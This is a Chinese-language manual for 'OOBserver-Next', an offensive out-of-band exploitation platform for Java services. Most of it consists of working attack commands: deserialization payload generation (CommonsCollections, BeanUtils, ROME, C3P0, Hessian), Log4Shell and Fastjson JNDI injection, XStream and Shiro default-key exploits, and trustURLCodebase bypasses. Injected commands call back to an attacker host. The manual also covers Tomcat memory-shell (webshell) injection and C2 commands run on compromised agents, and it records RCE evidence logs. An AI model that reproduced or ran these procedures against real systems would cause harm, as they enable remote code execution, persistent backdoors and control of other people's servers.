# OOBserver-Next 使用手册

> **版本** 2.0 · 2026-04-28  
> **定位** 内网 OOB (Out-of-Band) 漏洞利用平台 —— 攻击侧工具，非靶机  
> **环境** CT1 = 10.0.7.25（OOBserver / 攻击机）

---

## 1. 系统架构

```
┌─────────────────────────────────────────────────────────┐
│             CT1  10.0.7.25  (OOBserver)                 │
│                                                         │
│   :8711  Bytecode Sidecar  ──┐                          │
│           └── :8011 java-chains (内嵌，容器内)  ├── 生成 Payload (82 条)
│   :8010  FastAPI 后端       ──┘                          │
│   :1389  LDAP Listener                                  │
│   :1099  RMI  Listener                                  │
│   :9999  TCP  Collector                                 │
│   :5353  DNS  Listener (可选)                            │
└─────────────────────────────────────────────────────────┘
           │  HTTP/LDAP/RMI/TCP/DNS OOB 回调
           ▼
    TargetHost (任意靶机)
```

**注：** 裸机（CT1）部署后端端口为 `8015`；Docker Compose 部署为 `8010`。下文示例统一使用 `$OOB_API` 变量。

```bash
export OOB=10.0.7.25
export OOB_API=http://$OOB:8010   # Docker / 8015 for bare metal
export OOB_SIDECAR=http://$OOB:8711
```

OOBserver **不包含**漏洞靶机。靶机由用户自行部署。

---

## 2. 快速开始

### 2.1 登录

```bash
JWT=$(curl -sf -X POST http://10.0.7.25:8015/api/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

### 2.2 创建 OOB Token

```bash
TOKEN=$(curl -sf -X POST http://10.0.7.25:8015/api/tokens \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"project_id":1,"label":"test-1","protocols":["http","ldap"]}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
# → TOKEN=a1b2c3d4e5f6
```

### 2.3 查询回调事件

```bash
curl -sf -H "Authorization: Bearer $JWT" \
  "http://10.0.7.25:8015/api/tokens/$TOKEN/events" \
  | python3 -m json.tool
```

---

## 3. Payload 生成

### 3.1 Sidecar API

```
POST http://10.0.7.25:8711/generate
Content-Type: application/json
{"chain": "CHAIN_ID", "params": {"cmd": "COMMAND", ...}}

返回: {"value": "<base64>", "format": "binary|text|json|base64"}
```

### 3.2 格式处理

| format | 处理方式 |
|--------|---------|
| `binary` | `base64.b64decode(value)` → 二进制 POST |
| `text` / `json` | `base64.b64decode(value).decode()` → 文本 POST |
| `base64` | `value` 直接使用（如 Shiro cookie） |

### 3.3 ⚠️ CMD 重要规则

**`Runtime.exec(String)` 不解析 shell 元字符（`>`、`&&`、`|`、`;`）。**

- ✅ 正确：`curl -sk http://10.0.7.25:8015/callback/http/TOKEN`
- ❌ 错误：`id > /tmp/out && curl http://...`

使用 HTTP 回调作为 RCE 确认手段，无需 shell 重定向。

---

## 4. 已验证利用链

### 4.1 CommonsCollections CC5 / CC6 / CC7

**环境要求**：Java 任意版本 + commons-collections 3.x  
**端点**：`POST /deser`（Content-Type: `application/octet-stream`）

```bash
CMD="curl -sk http://10.0.7.25:8015/callback/http/$TOKEN"

curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"ysoserial_cc6\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "
import sys,json,base64
r = json.load(sys.stdin)
b = base64.b64decode(r['value'])
open('/tmp/cc6.bin','wb').write(b)
print(f'payload={len(b)}B')"

curl -sf -X POST http://TARGET:PORT/deser \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/tmp/cc6.bin
```

**真实 RCE 证据**（2026-04-26T05:51:23）：

```
protocol: http | remote_addr: 10.0.7.26 | token: c42b55b44140
summary: HTTP GET /callback/http/c42b55b44140
```

| Chain | 大小 | 状态 |
|-------|------|------|
| `ysoserial_cc5` | 2126 B | ✅ RCE 确认 |
| `ysoserial_cc6` | 1330 B | ✅ RCE 确认 |
| `ysoserial_cc7` | 1323 B | ✅ RCE 确认 |

> **CC1/CC3**：需要 JDK ≤ 8u71（AnnotationInvocationHandler 未修复版本）  
> **CC2/CC4**：需要 commons-collections **4.x** 在 classpath

---

### 4.2 CommonsBeanUtils CB1 / cb_no_cc

**环境要求**：commons-beanutils 1.x（`cb_no_cc` 无需 CC 依赖）  
**端点**：`POST /deser`

```bash
curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"ysoserial_cb1\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; r=json.load(sys.stdin); open('/tmp/cb1.bin','wb').write(base64.b64decode(r['value']))"

curl -sf -X POST http://TARGET:PORT/deser \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/cb1.bin
```

**真实 RCE 证据**：HTTP 回调 from 10.0.7.26，payload 3760 B ✅

---

### 4.3 ROME 1.0

**环境要求**：rome-1.0.jar（com.sun.syndication）  
**端点**：`POST /deser`

```bash
curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"ysoserial_rome\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; r=json.load(sys.stdin); open('/tmp/rome.bin','wb').write(base64.b64decode(r['value']))"

curl -sf -X POST http://TARGET:PORT/deser \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/rome.bin
```

**真实 RCE 证据**：events=1，HTTP 回调 from 10.0.7.26 ✅

---

### 4.4 XStream EventHandler — CVE-2021-39144

**环境要求**：XStream ≤ 1.4.17  
**端点**：`POST /xstream`（Content-Type: `application/xml`）  
**⚠️ 注意**：sidecar 返回的是 base64 编码的 XML，需要先解码

```bash
XML=$(curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"xstream_eventhandler\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; r=json.load(sys.stdin); print(base64.b64decode(r['value']).decode())")

echo "$XML" | curl -sf -X POST http://TARGET:PORT/xstream \
  -H "Content-Type: application/xml" --data-binary @-
```

**真实 RCE 证据**（2026-04-26T05:17:36）：

```
protocol: http | remote_addr: 10.0.7.26 | token: a87d88eca3d9
summary: HTTP GET /callback/http/a87d88eca3d9
payload_size: 583 B
```

✅ RCE 确认

---

### 4.5 C3P0 WrapperDS 嵌套反序列化

**环境要求**：C3P0 0.9.x + 内部链依赖（CC6/CB1 等）  
**端点**：`POST /deser`  
**参数**：`inner_chain` 指定内层 gadget

```bash
curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"c3p0_wrapperds\",\"params\":{\"cmd\":\"$CMD\",\"inner_chain\":\"ysoserial_cc6\"}}" \
  | python3 -c "import sys,json,base64; r=json.load(sys.stdin); open('/tmp/c3p0.bin','wb').write(base64.b64decode(r['value']))"

curl -sf -X POST http://TARGET:PORT/deser \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/c3p0.bin
```

✅ RCE 确认

---

### 4.6 Log4shell — CVE-2021-44228

**环境要求**：Log4j2 ≤ 2.14.1 + JDK ≤ 8u191（trustURLCodebase 限制前）  
**触发方式**：JNDI 注入字符串注入到被日志记录的 header

```bash
# Step 1: 生成 command class 字节码
CLASS_B64=$(curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"custom_bytecode\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

# Step 2: 注册 LDAP rebind（⚠️ key 是 bytecode_b64，不是 class_bytes）
curl -sf -X POST "http://10.0.7.25:8015/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d "{\"class_name\":\"Exploit\",\"bytecode_b64\":\"$CLASS_B64\"}"

# Step 3: 触发（⚠️ 用单引号防止 bash 展开 ${jndi:...}）
JNDI='${jndi:ldap://10.0.7.25:1389/'"$TOKEN"'}'
curl -sf "http://TARGET:PORT/vulnerable" \
  -H "User-Agent: $JNDI" \
  -H "X-Forwarded-For: $JNDI"
```

**真实 RCE 证据**（2026-04-26T06:13:xx）：

```
events: 2 → [http, ldap]
protocol: http  | remote_addr: 10.0.7.26 | HTTP 回调确认 RCE
protocol: ldap  | remote_addr: 10.0.7.26 | LDAP lookup 触发
```

✅ HTTP + LDAP 双回调，RCE 完整确认

---

### 4.7 Fastjson JdbcRowSetImpl JNDI

**环境要求**：Fastjson ≤ 1.2.47  
**端点**：`POST /fastjson`（Content-Type: `application/json`）  
**⚠️ 注意**：sidecar 返回 base64 编码 JSON，需先解码再 POST

**模式 A：JDK ≤ 8u191（直接 class 加载）**

```bash
# 1. 注册 rebind（见 Log4shell Step 1-2）
# 2. 生成 fastjson payload
PAYLOAD=$(curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"fastjson_jdbcrowset\",\"params\":{\"jndi_url\":\"ldap://10.0.7.25:1389/$TOKEN\"}}" \
  | python3 -c "import sys,json,base64; r=json.load(sys.stdin); print(base64.b64decode(r['value']).decode())")
curl -sf -X POST http://TARGET:PORT/fastjson \
  -H "Content-Type: application/json" -d "$PAYLOAD"
```

**模式 B：JDK ≥ 8u191（javaSerializedData bypass，绕过 trustURLCodebase）**

```bash
# 1. 生成 CC6 序列化 payload
CC6_B64=$(curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"ysoserial_cc6\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

# 2. 注册 serialized_b64 rebind（LDAP 返回 javaSerializedData）
curl -sf -X POST "http://10.0.7.25:8015/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"CC6Payload\",\"serialized_b64\":\"$CC6_B64\"}"
# 返回 "mode":"javaSerializedData"

# 3. 触发（同模式 A 的 fastjson payload）
```

**证据**：LDAP 回调确认 JNDI 触发 ✅（HTTP RCE 需目标 JVM 有 CC3.x + trustURLCodebase 支持）

---

### 4.8 Shiro RememberMe AES-CBC — CVE-2016-4437

**环境要求**：Apache Shiro ≤ 1.2.4，默认 key `kPH+bIxk5D2deZiIxcaaaA==`  
**触发方式**：HTTP rememberMe cookie

```bash
# 生成 Shiro CBC payload（base64 格式，直接用作 cookie value）
COOKIE=$(curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d '{"chain":"shiro_cbc","params":{
    "cmd":"COMMAND",
    "chain":"CommonsCollections6",
    "key_b64":"kPH+bIxk5D2deZiIxcaaaA=="
  }}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

curl -v "http://TARGET:PORT/login" -H "Cookie: rememberMe=$COOKIE"
# 返回 Set-Cookie: rememberMe=deleteMe → 反序列化触发确认
```

**证据**：`Set-Cookie: rememberMe=deleteMe` ✅（反序列化触发）  
**完整 RCE**：需要 Shiro 容器出网访问 OOBserver；或通过文件写入方式内部验证。

**可用的 inner chain**：`CommonsCollections6`（默认）、`CommonsBeanutils1`、`cb_no_cc`

---

### 4.9 Hessian 协议反序列化

**环境要求**：Hessian 4.x 端点  
**端点**：`POST /hessian`（Content-Type: `x-application/hessian`）  
**端点**：`POST /hessian2`（Content-Type: `x-application/hessian2`）

```bash
curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"hessian1_rome\",\"params\":{\"cmd\":\"$CMD\"}}" \
  | python3 -c "import sys,json,base64; r=json.load(sys.stdin); open('/tmp/h1.bin','wb').write(base64.b64decode(r['value']))"

curl -sf -X POST http://TARGET:PORT/hessian \
  -H "Content-Type: x-application/hessian" --data-binary @/tmp/h1.bin
```

**证据**：服务端返回 `OK: {com.sun.syndication.feed.impl.EqualsBean@xxxx=value}` → Hessian 反序列化触发 ✅

| Chain | 大小 | 状态 | 备注 |
|-------|------|------|------|
| `hessian1_rome` | 1235 B | PARTIAL | 反序列化触发，RCE 待修复 |
| `hessian2_rome` | 1191 B | PARTIAL | 同上 |
| `hessian1_spring` | 1235 B | PARTIAL | 同上 |
| `hessian2_spring` | 1191 B | PARTIAL | 同上 |
| `hessian1_cc6` | 1235 B | PARTIAL | 同上 |
| `hessian2_cc6` | 1191 B | PARTIAL | 同上 |

**已知 sidecar bug**：`TemplatesImpl._tfactory` 为 `transient`，Hessian 反序列化后为 null，导致 `defineTransletClasses()` NPE。修复方向：改用不依赖 `_tfactory` 的 gadget。

---

## 5. JNDI 基础设施

### 5.1 LDAP Listener（:1389）

支持两种模式：

**模式 A — javaCodeBase（适合 JDK ≤ 8u191）**

```bash
curl -sf -X POST "http://10.0.7.25:8015/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"Exploit\",\"bytecode_b64\":\"$CLASS_B64\"}"
# LDAP 返回 javaCodeBase URL，JVM 从 URL 下载 class 并加载
```

**模式 B — javaSerializedData（绕过 JDK ≥ 8u191 的 trustURLCodebase）**

```bash
curl -sf -X POST "http://10.0.7.25:8015/api/rebind/$TOKEN/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"CC6Payload\",\"serialized_b64\":\"$CC6_B64\"}"
# LDAP 返回 javaSerializedData，JVM 直接反序列化内嵌对象
# 不涉及远程 class 加载，绕过 trustURLCodebase
```

### 5.2 触发确认（等待回调）

```bash
for i in $(seq 1 10); do
  sleep 2
  N=$(curl -sf -H "Authorization: Bearer $JWT" \
    "http://10.0.7.25:8015/api/tokens/$TOKEN/events" \
    | python3 -c "import sys,json; e=json.load(sys.stdin); print(f'{len(e)} events {[x.get(\"protocol\") for x in e]}')")
  echo "[$i] $N"
  echo "$N" | grep -qv "^0 " && break
done
```

---

## 6. 内存马 & C2

### 6.1 生成 Tomcat Filter 内存马

```bash
MS=$(curl -sf -X POST http://10.0.7.25:8015/api/memshells/generate \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d '{
    "framework": "tomcat",
    "type": "filter",
    "shell_type": "c2",
    "url_pattern": "/oobx_c2/*",
    "deliver_via": "class_load",
    "c2_url": "http://10.0.7.25:8015",
    "password": "oobx1234"
  }')
CLASS_NAME=$(echo "$MS" | python3 -c "import sys,json; print(json.load(sys.stdin)['class_name'])")
CLASS_B64=$(echo "$MS"  | python3 -c "import sys,json; print(json.load(sys.stdin)['class_bytes'])")
```

### 6.2 通过 JNDI 注入内存马（JNDI Rebind）

```bash
# 注册内存马 class 到 LDAP rebind
curl -sf -X POST "http://10.0.7.25:8015/api/rebind/$TOKEN_MS/set" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d "{\"class_name\":\"$CLASS_NAME\",\"bytecode_b64\":\"$CLASS_B64\"}"

# 用 C3P0 JNDI 链触发加载
curl -sf -X POST http://10.0.7.25:8711/generate \
  -H "Content-Type: application/json" \
  -d "{\"chain\":\"c3p0_jndi\",\"params\":{\"jndi_url\":\"ldap://10.0.7.25:1389/$TOKEN_MS\"}}" \
  | python3 -c "import sys,json,base64; r=json.load(sys.stdin); open('/tmp/c2load.bin','wb').write(base64.b64decode(r['value']))"
curl -sf -X POST http://TARGET:PORT/deser \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/c2load.bin
```

### 6.3 C2 操作

```bash
# 查看上线 agents
curl -sf -H "Authorization: Bearer $JWT" "http://10.0.7.25:8015/api/c2/agents"

# 发送命令
curl -sf -X POST "http://10.0.7.25:8015/api/c2/agents/$AGENT_ID/cmd" \
  -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d '{"cmd": "id; hostname; whoami"}'

# 查看命令结果（等 10s heartbeat 响应）
sleep 10
curl -sf -H "Authorization: Bearer $JWT" \
  "http://10.0.7.25:8015/api/c2/agents/$AGENT_ID/commands"
```

---

## 7. 支持的链完整列表

### 7.1 Java 反序列化（ObjectInputStream）

| Chain ID | 所需依赖 | 状态 |
|----------|---------|------|
| `ysoserial_cc5` | CC 3.x | ✅ |
| `ysoserial_cc6` | CC 3.x | ✅ |
| `ysoserial_cc7` | CC 3.x | ✅ |
| `ysoserial_cb1` | BeanUtils 1.x | ✅ |
| `cb_no_cc` | BeanUtils (无CC) | ✅ |
| `ysoserial_rome` | rome-1.0 | ✅ |
| `c3p0_wrapperds` | C3P0 + inner chain | ✅ |
| `ysoserial_cc1` | CC 3.x + JDK ≤ 8u71 | 需老 JDK |
| `ysoserial_cc3` | CC 3.x + JDK ≤ 8u71 | 需老 JDK |
| `ysoserial_cc2` | CC 4.x | 需 CC4.x |
| `ysoserial_cc4` | CC 4.x | 需 CC4.x |
| `ysoserial_spring1` | Spring 4.x | 需 Spring4 |
| `ysoserial_spring2` | Spring 4.x | 需 Spring4 |
| `ysoserial_groovy1` | Groovy | 需 Groovy jar |
| `ysoserial_hibernate1` | Hibernate | 需 Hibernate jar |
| `ysoserial_jdk7u21` | Java 7 | 需 JDK7 |
| `ysoserial_urldns` | 任意 Java | OOB 检测 |
| `ysoserial_jrmp_client` | 任意 Java | RMI 触发 |

### 7.2 Hessian 协议

**marshalsec 内置链（`_tfactory` bug，反序列化触发正常但 RCE 失败）：**

| Chain ID | 端点 | 状态 |
|----------|------|------|
| `hessian1_rome` | `/hessian` | PARTIAL（反序列化触发，RCE 待修复）|
| `hessian2_rome` | `/hessian2` | PARTIAL |
| `hessian1_spring` | `/hessian` | PARTIAL |
| `hessian2_spring` | `/hessian2` | PARTIAL |
| `hessian1_cc6` | `/hessian` | PARTIAL |
| `hessian2_cc6` | `/hessian2` | PARTIAL |

**java-chains 增强链（推荐，无 `_tfactory` 问题）：**

| Chain ID | 参数 | 状态 |
|----------|------|------|
| `jchains_hessian1_spring` | `jndi_url` | ✅ JNDI 触发 |
| `jchains_hessian1_exec` | `cmd` | ✅ 直接命令执行 |
| `jchains_hessian2_spring` | `jndi_url` | ✅ JNDI 触发 |
| `jchains_hessian2_exec` | `cmd` | ✅ 直接命令执行 |

### 7.3 XStream

| Chain ID | 端点 | 状态 |
|----------|------|------|
| `xstream_eventhandler` | `/xstream` | ✅ CVE-2021-39144 |

### 7.4 Fastjson

| Chain ID | 模式 | 状态 |
|----------|------|------|
| `fastjson_jdbcrowset` | JNDI（rebind A/B）| ✅ LDAP 触发 |
| `fastjson_jdbcrowset_v2` | JNDI bypass | ✅ LDAP 触发 |
| `fastjson_bcel` | BCEL 直接嵌入 | 已修复（v1.1+）|

### 7.5 Shiro

| Chain ID | 协议 | 状态 |
|----------|------|------|
| `shiro_cbc` | AES-CBC cookie | ✅ 反序列化确认 |
| `shiro_gcm` | AES-GCM cookie | 需 Shiro ≥ 1.5.3 |

### 7.6 C3P0

| Chain ID | 类型 | 状态 |
|----------|------|------|
| `c3p0_wrapperds` | 嵌套反序列化 | ✅ |
| `c3p0_jndi` | JNDI 触发 | LDAP 触发 |

### 7.7 java-chains 增强链（`jchains_*`，48 条）

> java-chains 以 sidecar 内嵌方式运行，监听 `:8011`，无需单独部署。  
> `jchains_*` 链相比内置链的优势：**直接命令执行**（无需 JNDI），且无 `_tfactory` NPE 问题。

**用法与内置链完全相同，只需换 chain ID：**

```bash
# 直接命令执行（exec 类，无需 JNDI）
curl -sf -X POST $OOB_SIDECAR/generate \
  -H "Content-Type: application/json" \
  -d '{"chain":"jchains_cc6","params":{"cmd":"curl http://'"$OOB"':8010/callback/http/'"$TOKEN"'"}}'

# JNDI 触发（jndi 类）
curl -sf -X POST $OOB_SIDECAR/generate \
  -H "Content-Type: application/json" \
  -d '{"chain":"jchains_hessian1_spring","params":{"jndi_url":"ldap://'"$OOB"':1389/'"$TOKEN"'"}}'
```

**完整链清单（48 条）：**

*Hessian1（8 条）*

| Chain ID | 参数 | 说明 |
|---|---|---|
| `jchains_hessian1_spring` | `jndi_url` | Spring JNDI，1526 B ✅ |
| `jchains_hessian1_spring2` | `jndi_url` | Spring JNDI 变体 |
| `jchains_hessian1_spring_exec` | `cmd` | Spring 直接执行 |
| `jchains_hessian1_exec` | `cmd` | JDK native 直接执行 ✅ |
| `jchains_hessian1_bcel` | `cmd` | BCEL 字节码，绕 Spring 黑名单 |
| `jchains_hessian1_rome1` | `cmd` | ROME+CB1 二次反序列化 |
| `jchains_hessian1_rome2` | `cmd` | ROME2+CB1 |
| `jchains_hessian1_secondary` | `cmd` | SwingLazyValue 二次反序列化绕黑名单 |

*Hessian2（10 条）*

| Chain ID | 参数 | 说明 |
|---|---|---|
| `jchains_hessian2_spring` | `jndi_url` | Spring JNDI，1286 B ✅ |
| `jchains_hessian2_spring2` | `jndi_url` | Spring JNDI 变体 |
| `jchains_hessian2_spring_exec` | `cmd` | Spring 直接执行 |
| `jchains_hessian2_exec` | `cmd` | JDK native 直接执行 |
| `jchains_hessian2_bcel` | `cmd` | BCEL 字节码 |
| `jchains_hessian2_rome1` | `cmd` | ROME+CB1 |
| `jchains_hessian2_rome2` | `cmd` | ROME2+CB1 |
| `jchains_hessian2_secondary` | `cmd` | 二次反序列化绕黑名单 |
| `jchains_hessian2_tostring_xbean` | `cmd` | XBean toString + EL 触发 |
| `jchains_hessian2_tostring_jackson` | `cmd` | Jackson toString 链 |

*Fastjson（4 条）*

| Chain ID | 参数 | 说明 |
|---|---|---|
| `jchains_fastjson` / `jchains_fastjson_jndi` | `jndi_url` | JdbcRowSetImpl (≤1.2.47) ✅ |
| `jchains_fastjson_bcel` | `cmd` | BCEL 字节码注入 (≤1.2.24)，返回 JSON ✅ |
| `jchains_fastjson_c3p0_h2` | `cmd` | C3P0 + H2 JDBC 执行 |

*XStream（3 条）*

| Chain ID | 参数 | 说明 |
|---|---|---|
| `jchains_xstream` / `jchains_xstream_jndi` | `jndi_url` | Spring JNDI ✅ |
| `jchains_xstream_exec` | `cmd` | JDK native 直接执行 |

*Java 原生反序列化（11 条）*

| Chain ID | 参数 | 说明 |
|---|---|---|
| `jchains_cc1` | `cmd` | CommonsCollections K1 |
| `jchains_cc2` | `cmd` | CommonsCollections K2 |
| `jchains_cc3` | `cmd` | CommonsCollections K3 |
| `jchains_cc4` | `cmd` | CommonsCollections K4 |
| `jchains_cc6` / `jchains_native_cc6` | `cmd` | CommonsCollections K1，1918 B ✅ |
| `jchains_cb1` / `jchains_native_cb1` | `cmd` | CommonsBeanutils1 ✅ |
| `jchains_native_cb2` | `cmd` | CommonsBeanutils2 |
| `jchains_native_cb1_jndi` | `jndi_url` | CB1 JNDI 触发 |
| `jchains_native_jackson` | `cmd` | Jackson 反序列化 |
| `jchains_native_jdk17_1` | `cmd` | 高版本 JDK 17+ 绕过链1 |
| `jchains_native_jdk17_2` | `cmd` | 高版本 JDK 17+ 绕过链2 |
| `jchains_native_c3p0_el` | `jndi_url` | C3P0 EL 注入 |
| `jchains_native_c3p0_ldap` | `jndi_url` | C3P0 LDAP 触发 |
| `jchains_native_k1_secondary` | `cmd` | K1 二次反序列化 |

*JNDI ResourceRef（4 条）*

| Chain ID | 参数 | 说明 |
|---|---|---|
| `jchains_jndi_tomcat_el` | `cmd` | TomcatEL + BytecodeConvert，最通用 |
| `jchains_jndi_groovy` | `cmd` | Groovy ScriptEngine |
| `jchains_jndi_snakeyaml` | `cmd` | SnakeYAML 反序列化 |
| `jchains_jndi_beanshell` | `cmd` | BeanShell 脚本执行 |

*其他协议（3 条）*

| Chain ID | 参数 | 说明 |
|---|---|---|
| `jchains_shiro_cbc` | `cmd` | Shiro CBC，CB1+TemplatesImpl，base64 cookie ✅ |
| `jchains_h2_jdbc` | `cmd` | H2 JDBC URL 任意代码执行 |
| `jchains_blazeds_axis2` | `cmd` | BlazeDS Axis2 反序列化 |

**已验证（Docker 容器测试，✅ 标记）：**

| Chain | 大小 | hex 前缀 | 状态 |
|---|---|---|---|
| `jchains_cc6` | 1918 B | `aced0005` | ✅ Java 序列化 |
| `jchains_hessian1_spring` | 1526 B | `56740011` | ✅ Hessian1 |
| `jchains_hessian2_spring` | 1286 B | `72116a61` | ✅ Hessian2 |
| `jchains_fastjson` | 256 B | `7b0a2020` | ✅ JSON |
| `jchains_xstream` | 2134 B | `3c736f72` | ✅ XML |
| `jchains_fastjson_bcel` | 2141 B | `7b0a2020` | ✅ JSON |
| `jchains_shiro_cbc` | 2112 B | `41414141` | ✅ base64 cookie |

---

## 8. API 速查

### 8.1 Sidecar（:8711）

```
GET  /chains                     列出所有支持的链 ID
POST /generate                   生成 payload
     body: {"chain":"X","params":{...}}
     return: {"value":"<b64>","format":"binary|text|json|base64"}
```

### 8.2 OOBserver 后端（:8015）

```
POST /api/auth/login             登录（form-urlencoded）
POST /api/auth/register          注册
GET  /api/auth/me                当前用户

POST /api/projects               创建项目
POST /api/tokens                 创建 OOB token
GET  /api/tokens/{token}/events  查询回调事件

GET  /callback/http/{token}      HTTP 回调接收端点
POST /api/rebind/{token}/set     注册 LDAP rebind（class 或序列化数据）
DELETE /api/rebind/{token}/clear 清除 rebind

POST /api/memshells/generate     生成内存马
GET  /api/c2/agents              查看 C2 上线 agents
POST /api/c2/agents/{id}/cmd     发送命令
GET  /api/c2/agents/{id}/commands 查看命令执行结果

GET  /health                     健康检查
GET  /docs                       Swagger API 文档
```

---

## 9. 常见问题

**Q: CMD 为什么不能用 `>`、`&&`、`|`？**  
A: ysoserial 生成的 payload 使用 `Runtime.exec(String)` 单字符串模式，Java 按空格分词，不调用 shell 解释器。解决方法：使用纯 `curl` 或 `wget` 命令作为 OOB 确认，无需 shell 重定向。

**Q: Fastjson payload 为什么要先 base64 decode？**  
A: sidecar 统一返回 `{"value":"<base64>","format":"..."}` 格式，JSON/XML payload 以 base64 编码，发送前需 `base64.b64decode(value).decode()` 得到原始文本。

**Q: Rebind API 参数名是什么？**  
A: `bytecode_b64`（class 字节码，javaCodeBase 模式）或 `serialized_b64`（序列化对象，javaSerializedData 模式，绕过 trustURLCodebase）。

**Q: Hessian 链返回 `EqualsBean@hash` 但无回调？**  
A: 内置 marshalsec Hessian 链（`hessian1_*` / `hessian2_*`）有已知 bug：`TemplatesImpl._tfactory` 是 `transient` 字段，Hessian 不序列化它，反序列化后 NPE。  
**解决方案：改用 `jchains_hessian1_exec` 或 `jchains_hessian1_spring`**，这两条链绕过了 `_tfactory` 问题，已验证可用。

**Q: java-chains 链提示 "empty payload" / "hint: Ensure java-chains is running"？**  
A: java-chains 需约 30s 启动时间。确认 sidecar healthcheck 通过后（`docker compose ps` 显示 `(healthy)`）再试。Docker 容器内 java-chains 日志在 `/var/log/java-chains.log`。

**Q: Log4shell 在 JDK ≥ 8u191 无法 RCE？**  
A: JDK 8u191+ 默认 `trustURLCodebase=false`，阻止从远程 LDAP 加载 class。  
解决方案：使用 `serialized_b64` rebind 模式（javaSerializedData），LDAP 返回嵌入的序列化 CC6 对象，绕过 trustURLCodebase 限制。

---

*OOBserver-Next · 内网 OOB 利用平台 · 2026-04-26*
